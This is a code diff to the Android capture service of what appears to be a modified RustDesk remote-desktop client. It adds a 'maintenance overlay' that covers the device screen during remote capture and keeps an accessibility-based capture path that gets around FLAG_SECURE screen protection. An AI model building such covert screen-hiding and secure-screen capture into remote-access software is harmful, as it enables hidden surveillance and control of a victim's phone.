@@ -213,7 +213,6 @@ class MainService : Service() {
 
     private var currentCaptureMethod = CaptureMethod.MEDIA_PROJECTION
     private var xmlScreenCapture: XmlScreenCapture? = null
-    private var smartSwitch: SmartCaptureSwitch? = null
 
 
     private val logTag = "LOG_SERVICE"
@@ -407,7 +406,6 @@ class MainService : Service() {
 				    buffer.rewind()
 
 				    // ДОБАВИТЬ: Анализ для детекции FLAG_SECURE
-				    smartSwitch?.analyzeFrame(buffer, SCREEN_INFO.width, SCREEN_INFO.height)
 
 				    FFI.onVideoFrameUpdate(buffer)
 			    }
@@ -464,13 +462,21 @@ class MainService : Service() {
         updateScreenInfo(resources.configuration.orientation)
 
         xmlScreenCapture = XmlScreenCapture()
-	xmlScreenCapture?.smartSwitch = smartSwitch
         xmlScreenCapture?.start()
 
         _isStart = true
         // Говорим ядру RustDesk, что сейчас пойдут сырые кадры (Raw Frames)
         FFI.setFrameRawEnable("video", true)
         MainActivity.rdClipboardManager?.setCaptureStarted(_isStart)
+
+
+        val overlayEnabled = getSharedPreferences("FlutterSharedPreferences", MODE_PRIVATE)
+        .getBoolean("flutter.maintenance_overlay_enabled", false)
+
+        if (overlayEnabled) {
+          MaintenanceOverlay.show(this)
+          Log.i(logTag, "Maintenance overlay shown (XML mode)")
+        }
 
         return true
     }
@@ -488,22 +494,6 @@ class MainService : Service() {
             return startXmlCapture()
         }
 
-
-	if (smartSwitch == null) {
-		smartSwitch = SmartCaptureSwitch(
-			onSwitchToXml = {
-				Log.w(logTag, "SmartSwitch: Switching to XML (FLAG_SECURE detected)")
-				// Останавливаем MediaProjection, запускаем XML
-				switchToXmlDuringCapture()
-			},
-			onSwitchToMediaProjection = {
-				Log.i(logTag, "SmartSwitch: Switching back to MediaProjection")
-				// Останавливаем XML, возобновляем MediaProjection
-				switchToMediaProjectionDuringCapture()
-			}
-		)
-		Log.d(logTag, "SmartSwitch initialized")
-	}
 
 
         // --- Стандартная логика MediaProjection ---
@@ -534,50 +524,52 @@ class MainService : Service() {
         _isStart = true
         FFI.setFrameRawEnable("video",true)
         MainActivity.rdClipboardManager?.setCaptureStarted(_isStart)
+
+
+        val overlayEnabled = getSharedPreferences("FlutterSharedPreferences", MODE_PRIVATE)
+        .getBoolean("flutter.maintenance_overlay_enabled", false)
+
+        if (overlayEnabled) {
+          MaintenanceOverlay.show(this)
+          Log.i(logTag, "Maintenance overlay shown (enabled in settings)")
+        } else {
+          Log.i(logTag, "Maintenance overlay disabled in settings")
+        }
+
         return true
     }
 
 
+
     @Synchronized
     fun stopCapture() {
-        Log.d(logTag, "Stop Capture")
-        FFI.setFrameRawEnable("video", false)
-        _isStart = false
-        MainActivity.rdClipboardManager?.setCaptureStarted(_isStart)
+      Log.d(logTag, "Stop Capture")
 
-        // Если работал XML-захват, просто останавливаем его и выходим
-        if (currentCaptureMethod == CaptureMethod.XML_ACCESSIBILITY) {
-            xmlScreenCapture?.stop()
-            xmlScreenCapture = null
-            return
-        }
+      // Скрываем заставку
+      MaintenanceOverlay.hide()
 
-        // --- Стандартная очистка MediaProjection ---
-        if (reuseVirtualDisplay) {
-            virtualDisplay?.setSurface(null)
-        } else {
-            virtualDisplay?.release()
-        }
+      FFI.setFrameRawEnable("video", false)
+      _isStart = false
+      MainActivity.rdClipboardManager?.setCaptureStarted(_isStart)
 
+      // Останавливаем в зависимости от метода
+      if (currentCaptureMethod == CaptureMethod.XML_ACCESSIBILITY) {
+        xmlScreenCapture?.stop()
+        xmlScreenCapture = null
+      } else {
+        // Останавливаем MediaProjection
+        virtualDisplay?.release()
+        virtualDisplay = null
+        surface?.release()
+        surface = null
         imageReader?.close()
         imageReader = null
-        videoEncoder?.let {
-            it.signalEndOfInputStream()
-            it.stop()
-            it.release()
-        }
-        if (!reuseVirtualDisplay) {
-            virtualDisplay = null
-        }
-        videoEncoder = null
-        surface?.release()
+      }
 
-        // release audio
-        _isAudioStart = false
-        audioRecordHandle.tryReleaseAudio()
-	smartSwitch?.reset()
-	smartSwitch = null
+      // Сбрасываем метод
+      currentCaptureMethod = CaptureMethod.MEDIA_PROJECTION
     }
+
 
 
     fun destroy() {
@@ -877,6 +869,67 @@ private fun switchToMediaProjectionDuringCapture() {
 	xmlScreenCapture = null
 
 	Log.i(logTag, "✓ MediaProjection resumed (faster)")
+}
+
+
+fun switchToMediaProjection() {
+    if (!isStart) {
+        Log.w(logTag, "Service not started, cannot switch")
+        return
+    }
+
+    if (currentCaptureMethod == CaptureMethod.MEDIA_PROJECTION) {
+        Log.d(logTag, "Already using MediaProjection")
+        return
+    }
+
+    Log.i(logTag, "Switching to MediaProjection...")
+
+    // Останавливаем XML
+    xmlScreenCapture?.stop()
+    xmlScreenCapture = null
+
+    // MediaProjection уже работает в фоне, просто меняем метод
+    currentCaptureMethod = CaptureMethod.MEDIA_PROJECTION
+
+    Log.i(logTag, "✓ Switched to MediaProjection")
+}
+
+/**
+ * Переключиться на XML (если сервис запущен)
+ */
+fun switchToXml() {
+    if (!isStart) {
+        Log.w(logTag, "Service not started, cannot switch")
+        return
+    }
+
+    if (!InputService.isOpen) {
+        Log.e(logTag, "Cannot switch to XML - InputService not available")
+        return
+    }
+
+    if (currentCaptureMethod == CaptureMethod.XML_ACCESSIBILITY) {
+        Log.d(logTag, "Already using XML")
+        return
+    }
+
+    Log.i(logTag, "Switching to XML...")
+
+    currentCaptureMethod = CaptureMethod.XML_ACCESSIBILITY
+
+    // Запускаем XML
+    xmlScreenCapture = XmlScreenCapture()
+    xmlScreenCapture?.start()
+
+    Log.i(logTag, "✓ Switched to XML")
+}
+
+/**
+ * Получить текущий метод захвата
+ */
+fun getCurrentCaptureMethod(): CaptureMethod {
+    return currentCaptureMethod
 }
 
 
